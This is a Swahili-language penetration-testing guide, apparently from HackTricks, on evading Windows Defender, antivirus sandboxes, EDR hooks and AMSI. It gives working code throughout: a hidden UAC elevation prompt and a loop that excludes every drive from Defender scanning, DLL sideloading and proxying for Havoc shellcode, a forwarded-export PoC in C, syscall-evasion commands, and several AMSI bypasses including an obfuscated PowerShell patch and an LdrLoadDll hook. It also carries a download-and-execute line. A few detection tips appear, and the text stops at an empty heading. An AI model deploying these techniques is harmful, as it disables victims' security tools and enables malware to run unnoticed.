# Kukwepa Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Kusimamisha Defender

- [defendnot](https://github.com/es3n1n/defendnot): Zana ya kusimamisha Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Zana ya kusimamisha Windows Defender kufanya kazi kwa kujifanya AV nyingine.
- [Zima Defender ikiwa wewe ni admin](basic-powershell-for-pentesters/README.md)

### Mtego wa UAC wa mtindo wa installer kabla ya kuchezea Defender

Loaders za umma zinazojifanya cheats za michezo mara nyingi husambazwa kama installers za Node.js/Nexe ambazo hazijasainiwa, na kwanza **humwomba mtumiaji ruhusa za juu** ndipo zizime Defender. Mtiririko wake ni rahisi:

1. Kagua kama kuna muktadha wa kiutawala kwa kutumia `net session`. Amri hii hufaulu tu pale anayeiendesha ana haki za admin, kwa hiyo ikishindwa inaashiria kuwa loader inaendeshwa na mtumiaji wa kawaida.
2. Ijiendeshe upya mara moja kwa kutumia kitenzi cha `RunAs` ili kuonyesha kidokezo cha kawaida cha idhini ya UAC huku ikihifadhi command line ya awali.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Waathiriwa tayari wanaamini kwamba wanasakinisha programu “cracked”, kwa hivyo kwa kawaida wanakubali kidokezo hicho, na hivyo kuipa malware ruhusa inazohitaji kubadilisha sera ya Defender.<sup>[[26]](#references)</sup>

### Vizuizi vya `MpPreference` vinavyotumika kwa kila herufi ya kiendeshi

Baada ya kupata haki za juu, minyororo ya mashambulizi ya mtindo wa GachiLoader huongeza maeneo ambayo Defender haiwezi kuchanganua badala ya kuzima huduma moja kwa moja. Loader kwanza husimamisha programu ya GUI inayofuatilia hali (`taskkill /F /IM SecHealthUI.exe`) kisha huweka **vizuizi vipana mno** ili kila wasifu wa mtumiaji, saraka ya mfumo na diski inayoweza kutolewa isiweze kuchanganuliwa:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Kitanzi hupitia kila filesystem iliyowekwa (D:\, E:\, USB sticks, n.k.), kwa hivyo **payload yoyote ya baadaye itakayowekwa mahali popote kwenye diski itapuuzwa**.
- Kutenga kiendelezi cha `.sys` ni hatua ya baadaye—washambuliaji wanahifadhi chaguo la kupakia drivers zisizosainiwa baadaye bila kugusa Defender tena.
- Mabadiliko yote huwekwa chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo hatua za baadaye zinaweza kuthibitisha kuwa exclusions zimeendelea kuwepo au kuziongeza bila kusababisha UAC kuonekana tena.

Kwa kuwa hakuna huduma ya Defender inayositishwa, ukaguzi wa kawaida wa afya huripoti kuwa “antivirus active” ingawa ukaguzi wa wakati halisi haugusi kamwe njia hizo.<sup>[[26]](#references)</sup>

## **Mbinu za Kukwepa AV**

Kwa sasa, AV hutumia mbinu tofauti za kuangalia kama faili ni hasidi au la: utambuzi tuli, uchanganuzi wa nguvu, na kwa EDR za kisasa zaidi, uchanganuzi wa kitabia.

### **Utambuzi tuli**

Utambuzi tuli hufanywa kwa kutambua mifuatano hasidi inayojulikana au safu za byte ndani ya binary au script, na pia kutoa taarifa kutoka kwenye faili lenyewe (k.m. maelezo ya faili, jina la kampuni, sahihi za kidijitali, ikoni, checksum, n.k.). Hii inamaanisha kuwa kutumia zana za umma zinazojulikana kunaweza kukufanya ugundulike kwa urahisi zaidi, kwa kuwa huenda tayari zimechanganuliwa na kutambuliwa kuwa hasidi. Kuna njia kadhaa za kukwepa aina hii ya utambuzi:

- **Usimbaji fiche**

Ukisimba binary kwa fiche, AV haitaweza kutambua programu yako, lakini utahitaji aina fulani ya loader ili kusimbua na kuendesha programu hiyo kwenye memory.

- **Ufichaji**

Wakati mwingine unachohitaji tu ni kubadilisha baadhi ya strings kwenye binary au script yako ili ipite AV, lakini hii inaweza kuchukua muda mwingi kutegemea unachojaribu kuficha.

- **Kutengeneza zana maalum**

Ukitengeneza zana zako mwenyewe, hakutakuwa na signatures mbaya zinazojulikana, lakini hili huchukua muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kujaribu dhidi ya utambuzi tuli wa Windows Defender ni kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi, hugawa faili katika sehemu nyingi kisha huiagiza Defender kuchanganua kila sehemu moja baada ya nyingine. Kwa njia hii, inaweza kukuonyesha hasa strings au bytes zilizo kwenye binary yako ambazo zimetambuliwa.

Ninakupendekezea sana uangalie [orodha hii ya video za YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu mbinu za vitendo za kukwepa AV.

### **Uchanganuzi wa nguvu**

Uchanganuzi wa nguvu ni pale AV inapozindua binary yako kwenye sandbox na kufuatilia shughuli hasidi (k.m. kujaribu kusimbua na kusoma passwords za browser yako, kufanya minidump ya LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi, lakini hapa kuna mambo unayoweza kufanya ili kukwepa sandbox.

- **Kusubiri kabla ya utekelezaji** Kulingana na jinsi inavyotekelezwa, hii inaweza kuwa njia nzuri ya kukwepa uchanganuzi wa nguvu wa AV. AV zina muda mfupi sana wa kuchanganua faili ili zisikatize kazi ya mtumiaji, kwa hivyo kutumia muda mrefu wa kusubiri kunaweza kutatiza uchanganuzi wa binary. Tatizo ni kwamba sandbox nyingi za AV zinaweza kuruka muda huo wa kusubiri, kutegemea jinsi ulivyotekelezwa.
- **Kukagua rasilimali za mashine** Kwa kawaida sandbox huwa na rasilimali chache sana (k.m. < 2GB RAM), la sivyo zinaweza kupunguza kasi ya mashine ya mtumiaji. Unaweza pia kuwa mbunifu zaidi hapa, kwa mfano kwa kukagua halijoto ya CPU au hata kasi ya feni—si kila kitu kitakuwa kimetekelezwa kwenye sandbox.
- **Ukaguzi maalum kwa mashine** Ikiwa unataka kumlenga mtumiaji ambaye workstation yake imeunganishwa kwenye domain ya "contoso.local", unaweza kukagua domain ya kompyuta ili kuona kama inalingana na uliyoainisha. Isipolingana, unaweza kufanya programu yako izime.

Imebainika kuwa computername ya sandbox ya Microsoft Defender ni HAL9TH. Kwa hiyo, unaweza kukagua jina la kompyuta kwenye malware yako kabla ya detonation. Jina likiwa HAL9TH, inamaanisha uko ndani ya sandbox ya Defender, hivyo unaweza kufanya programu yako izime.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine vizuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kuhusu kukwepa sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> chaneli ya #malware-dev</p></figcaption></figure>

Kama tulivyosema awali kwenye chapisho hili, **zana za umma** hatimaye **zitagunduliwa**, kwa hiyo unapaswa kujiuliza jambo moja:

Kwa mfano, ukitaka kudump LSASS, **unahitaji kweli kutumia mimikatz**? Au unaweza kutumia mradi tofauti usiojulikana sana ambao pia hudump LSASS?

Jibu sahihi huenda ni la pili. Tukichukulia mimikatz kama mfano, huenda ni mojawapo ya malware zinazotambuliwa zaidi na AV na EDR, au ndiyo inayotambuliwa zaidi. Ingawa mradi wenyewe ni mzuri sana, pia ni ndoto kufanya kazi nao ili kukwepa AV, kwa hiyo tafuta tu mbadala wa kile unachojaribu kufanya.

> [!TIP]
> Unaporekebisha payload zako ili zikwepe utambuzi, hakikisha **umezima uwasilishaji otomatiki wa sampuli** kwenye Defender, na tafadhali, kwa dhati, **USIPAKIE KWENYE VIRUSTOTAL** ikiwa lengo lako ni kufanikisha ukwepaji wa utambuzi kwa muda mrefu. Ikiwa unataka kuangalia kama AV fulani inatambua payload yako, isakinishe kwenye VM, jaribu kuzima uwasilishaji otomatiki wa sampuli, kisha ijaribu hapo hadi uridhike na matokeo.

## EXEs vs DLLs

Inapowezekana, **tanguliza kutumia DLLs kwa ajili ya kukwepa utambuzi**. Kwa uzoefu wangu, faili za DLL kwa kawaida **hazitambuliwi na kuchanganuliwa sana**, kwa hiyo hii ni mbinu rahisi sana ya kukwepa utambuzi katika baadhi ya hali (ikiwa payload yako inaweza kuendeshwa kama DLL, bila shaka).

Kama tunavyoona kwenye picha hii, DLL Payload kutoka Havoc ina kiwango cha utambuzi cha 4/26 kwenye antiscan.me, huku EXE payload ikiwa na kiwango cha utambuzi cha 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Ulinganisho wa antiscan.me wa Havoc EXE payload ya kawaida dhidi ya Havoc DLL ya kawaida</p></figcaption></figure>

Sasa tutaonyesha mbinu kadhaa unazoweza kutumia na faili za DLL ili zisijulikane zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia mpangilio wa utafutaji wa DLL unaotumiwa na loader kwa kuweka programu lengwa na payload(s) hasidi pamoja.

Unaweza kutafuta programu zinazoweza kuathiriwa na DLL Sideloading ukitumia [Siofra](https://github.com/Cybereason/siofra) na script ifuatayo ya powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Amri hii itatoa orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana **uchunguze mwenyewe programu zinazoweza kutumiwa kwa DLL Hijacking/Sideloading**. Mbinu hii ni ya kujificha sana ikitekelezwa vizuri, lakini ukitumia programu za DLL Sideloading zinazojulikana hadharani, unaweza kugundulika kwa urahisi.

Kuweka tu DLL hasidi yenye jina ambalo programu inatarajia kupakia hakutafanya payload yako ipakie, kwa sababu programu inatarajia kuwe na functions maalum ndani ya DLL hiyo. Ili kutatua suala hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** huelekeza calls ambazo programu hufanya kutoka kwenye DLL ya proxy (na hasidi) kwenda kwenye DLL asilia, hivyo kuhifadhi utendaji wa programu na kuwezesha kushughulikia utekelezaji wa payload yako.

Nitatumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Amri ya mwisho itatupatia faili 2: kiolezo cha msimbo chanzo cha DLL, na DLL ya awali iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Haya ndiyo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyofichwa kwa kutumia [SGN](https://github.com/EgeBalci/sgn)) pamoja na proxy DLL zina Detection rate ya 0/26 kwenye [antiscan.me](https://antiscan.me)! Hiyo naweza kuiita mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ninapendekeza sana** utazame [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kwa undani kuhusu tulichojadili.

### Kutumia Vibaya Forwarded Exports (ForwardSideLoading)

Moduli za Windows PE zinaweza ku-export functions ambazo kwa hakika ni "forwarders": badala ya kuonyesha code, ingizo la export huwa na mfuatano wa ASCII wa muundo `TargetDll.TargetFunc`. Caller anapotafuta export hiyo, Windows loader itafanya yafuatayo:

- Itapakia `TargetDll` ikiwa bado haijapakiwa
- Itatafuta `TargetFunc` ndani yake

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka kwenye namespace ya KnownDLLs iliyolindwa (kwa mfano, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ikiwa `TargetDll` si KnownDLL, hutumika mpangilio wa kawaida wa kutafuta DLL, unaojumuisha saraka ya moduli inayofanya forward resolution.

Hii huwezesha mbinu ya indirect sideloading: tafuta DLL iliyosainiwa inayofanya export ya function kuelekezwa kwenye jina la moduli isiyo KnownDLL, kisha weka DLL hiyo iliyosainiwa pamoja na DLL inayodhibitiwa na mshambuliaji na iliyopewa jina linalolingana kabisa na moduli lengwa lililoelekezwa. Forwarded export inapotumiwa, loader hufuata forward hiyo na kupakia DLL yako kutoka kwenye saraka hiyo hiyo, na hivyo kutekeleza DllMain yako.<sup>[[13]](#references)</sup>

Mfano ulioonekana kwenye Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` si KnownDLL, kwa hivyo hupatikana kwa kutumia mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili DLL ya mfumo iliyosainiwa hadi kwenye folda inayoweza kuandikiwa.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` hasidi kwenye folda hiyo hiyo. DllMain ndogo inatosha kutekeleza msimbo; huhitaji kutekeleza function iliyopitishwa ili kuanzisha DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Anzisha forward kwa kutumia LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Tabia iliyozingatiwa:
- rundll32 (signed) hupakia `keyiso.dll` (signed) ya side-by-side
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader hufuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader hupakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata hitilafu ya "missing API" baada tu ya `DllMain` kuendeshwa

Vidokezo vya kutafuta:
- Lenga exports zilizoforwardiwa ambapo moduli lengwa si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha exports zilizoforwardiwa kwa kutumia zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama orodha ya Windows 11 forwarder ili kutafuta zinazoweza kufaa: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Mawazo ya utambuzi/ulinzi:
- Fuatilia LOLBins (k.m., rundll32.exe) zinapopakia DLL zilizosainiwa kutoka kwenye njia zisizo za mfumo, kisha kupakia non-KnownDLLs zenye jina lilelile la msingi kutoka kwenye saraka hiyo
- Toa arifa kuhusu minyororo ya process/module kama: `rundll32.exe` → `keyiso.dll` isiyo ya mfumo → `NCRYPTPROV.dll` kwenye njia ambazo watumiaji wanaweza kuandikia
- Tekeleza sera za code integrity (WDAC/AppLocker) na ukatae ruhusa za write+execute kwenye saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni toolkit ya payload ya kukwepa EDRs kwa kutumia michakato iliyosimamishwa, direct syscalls na mbinu mbadala za utekelezaji`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya kujificha.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu; kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee zana moja tu. Ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls na Utatuzi wa SSN (SysWhispers4)

Mara nyingi EDR huweka **user-mode inline hooks** kwenye syscall stubs za `ntdll.dll`. Ili kukwepa hooks hizo, unaweza kutengeneza **direct** au **indirect** syscall stubs zinazopakia **SSN** (System Service Number) sahihi na kuingia kwenye kernel mode bila kutekeleza hooked export entrypoint.<sup>[[32]](#references)</sup>

**Chaguo za kuita:**
- **Direct (embedded)**: weka agizo la `syscall`/`sysenter`/`SVC #0` kwenye stub iliyotengenezwa (hakuna kufikia `ntdll` export).
- **Indirect**: ruka hadi kwenye `syscall` gadget iliyopo ndani ya `ntdll` ili mpito wa kernel uonekane kana kwamba umetoka `ntdll` (inafaa kwa kukwepa heuristic); **randomized indirect** huchagua gadget kutoka kwenye kundi kwa kila call.
- **Egg-hunt**: epuka kuweka mfuatano tuli wa opcode `0F 05` kwenye diski; tatua mfuatano wa syscall wakati wa runtime.

**Mikakati ya kutatua SSN inayostahimili hooks:**
- **FreshyCalls (VA sort)**: kadiria SSN kwa kupanga syscall stubs kulingana na virtual address badala ya kusoma bytes za stub.
- **SyscallsFromDisk**: mapia `\KnownDlls\ntdll.dll` safi, soma SSN kutoka kwenye `.text` yake, kisha iondoe ramani (hupita hooks zote zilizo kwenye memory).
- **RecycledGate**: changanya makadirio ya SSN kwa kupanga VA na uthibitishaji wa opcode wakati stub iko safi; tumia makadirio ya VA iwapo imewekewa hook.
- **HW Breakpoint**: weka DR0 kwenye agizo la `syscall` na utumie VEH kunasa SSN kutoka `EAX` wakati wa runtime, bila kuchanganua bytes zilizowekewa hook.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa kuzuia "[malware isiyo na faili](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzoni, AV ziliweza kuchanganua **faili zilizo kwenye diski** pekee, kwa hiyo ukiweza kwa namna fulani kuendesha payloads **moja kwa moja kwenye kumbukumbu**, AV isingeweza kufanya lolote kuizuia, kwa kuwa haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeunganishwa kwenye vipengele hivi vya Windows.

- User Account Control, au UAC (kuinua ruhusa za EXE, COM, MSI, au usakinishaji wa ActiveX)
- PowerShell (scripts, matumizi ya mwingiliano, na tathmini ya msimbo inayobadilika)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- VBA macros za Office

Huwezesha suluhisho za antivirus kukagua tabia ya script kwa kufichua maudhui ya script katika umbo lisilosimbwa na lisilofichwa kwa obfuscation.

Kuendesha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha tahadhari ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyoweka `amsi:` mwanzoni, ikifuatiwa na njia ya executable ambayo script iliendeshwa kutoka kwake; katika hali hii, powershell.exe

Hatukuweka faili yoyote kwenye diski, lakini bado tulinaswa kwenye kumbukumbu kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, msimbo wa C# pia hupitishwa kwenye AMSI. Hii huathiri hata `Assembly.Load(byte[])` inayotumiwa kupakia utekelezaji kwenye kumbukumbu. Ndiyo maana kutumia matoleo ya chini ya .NET (kama 4.7.2 au chini) kunapendekezwa kwa utekelezaji kwenye kumbukumbu ikiwa unataka kuepuka AMSI.

Kuna njia kadhaa za kukwepa AMSI:

- **Obfuscation**

Kwa kuwa AMSI hufanya kazi hasa kwa kutumia ugunduzi tuli, kubadilisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya kuepuka ugunduzi.

Hata hivyo, AMSI ina uwezo wa kufichua scripts zilizofanyiwa obfuscation hata zikiwa na tabaka nyingi, kwa hiyo obfuscation inaweza kuwa chaguo baya kutegemea jinsi inavyofanywa. Hii hufanya kuikwepa kusiwe rahisi moja kwa moja. Ingawa, wakati mwingine unachohitaji ni kubadilisha majina machache ya vigezo na utakuwa salama, kwa hiyo inategemea kiwango ambacho kitu kimewekewa alama.

- **AMSI Bypass**

Kwa kuwa AMSI hutekelezwa kwa kupakia DLL kwenye mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuichezea kwa urahisi hata ukiendesha kama mtumiaji asiye na ruhusa za juu. Kwa sababu ya dosari hii katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kukwepa uchanganuzi wa AMSI.

**Kulazimisha Hitilafu**

Kulazimisha uanzishaji wa AMSI ushindwe (amsiInitFailed) kutasababisha uchanganuzi usianzishwe kwa mchakato wa sasa. Hili lilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation), na Microsoft imeunda signature ili kuzuia matumizi mapana zaidi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Kilichohitajika tu ni mstari mmoja wa msimbo wa PowerShell ili kufanya AMSI isiweze kutumika katika mchakato wa sasa wa PowerShell. Bila shaka, mstari huu umetambuliwa na AMSI yenyewe, kwa hiyo unahitaji marekebisho fulani ili kutumia mbinu hii.

Huu hapa ni mkakati uliorekebishwa wa kukwepa AMSI, nilionakili kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Kumbuka kwamba huenda hii itawekwa alama mara tu chapisho hili litakapotoka, kwa hiyo hupaswi kuchapisha code yoyote ikiwa mpango wako ni kubaki bila kugunduliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta anwani ya function ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kuchanganua ingizo lililotolewa na mtumiaji) na kuibadilisha kwa instructions za kurudisha code ya E_INVALIDARG. Kwa njia hii, matokeo ya uchanganuzi halisi yatarudisha 0, ambayo hutafsiriwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina zaidi.

Pia kuna mbinu nyingine nyingi zinazotumiwa kukwepa AMSI kwa powershell. Angalia [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Kuzuia AMSI kwa kuzuia amsi.dll kupakiwa (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa kwenye process ya sasa. Mbinu madhubuti ya kukwepa, isiyofungamana na lugha maalum, ni kuweka hook ya user-mode kwenye `ntdll!LdrLoadDll` inayorudisha hitilafu ikiwa module iliyoombwa ni `amsi.dll`. Kwa hiyo, AMSI haipakizwi kamwe na hakuna uchanganuzi unaofanyika kwa process hiyo.<sup>[[23]](#references)</sup>

Muhtasari wa utekelezaji (pseudocode ya x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Vidokezo
- Hufanya kazi kwenye PowerShell, WScript/CScript na custom loaders kwa pamoja (chochote ambacho kingepakia AMSI).
- Iunganishe na kutuma scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka mabaki marefu ya command-line.
- Imeonekana ikitumiwa na loaders zinazoendeshwa kupitia LOLBins (kwa mfano, `regsvr32` ikiita `DllRegisterServer`).

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia hutengeneza script ya kukwepa AMSI.
Tool **[https://amsibypass.com/](https://amsibypass.com/)** pia hutengeneza script ya kukwepa AMSI na kuepuka signature kwa kutumia function zilizobainishwa na mtumiaji, variables na expressions za characters zilizowekwa bila mpangilio, na kubadilisha bila mpangilio herufi kubwa na ndogo kwenye maneno muhimu ya PowerShell ili kuepuka signature.

**Ondoa signature iliyogunduliwa**

Unaweza kutumia tool kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa signature ya AMSI iliyogunduliwa kutoka kwenye memory ya process ya sasa. Tool hii hufanya kazi kwa kuchanganua memory ya process ya sasa ili kupata signature ya AMSI, kisha kuibadilisha kwa maagizo ya NOP, na hivyo kuiondoa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI kwenye **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia PowerShell version 2**
Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi:

```bash
powershell.exe -version 2
```

## Uwekaji wa Kumbukumbu wa PS

Uwekaji wa kumbukumbu wa PowerShell ni kipengele kinachokuruhusu kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa muhimu kwa madhumuni ya ukaguzi na utatuzi wa matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kukwepa kutambuliwa**.

Ili kukwepa uwekaji wa kumbukumbu wa PowerShell, unaweza kutumia mbinu zifuatazo:

- **Zima PowerShell Transcription na Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa kusudi hili.
- **Tumia PowerShell version 2**: Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hiyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Tumia unmanaged PowerShell session**: Tumia [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuendesha PowerShell bila kuzindua `powershell.exe` (mbinu inayotumiwa na `powerpick` ya Cobalt Strike). Hii hukwepa vidhibiti vinavyohusishwa mahususi na mchakato wa `powershell.exe`, lakini yenyewe haizimi AMSI, Script Block Logging, wala ulinzi mwingine wote wa PowerShell; kiwango cha ulinzi hutegemea runtime na utekelezaji wa host.


## Obfuscation

> [!TIP]
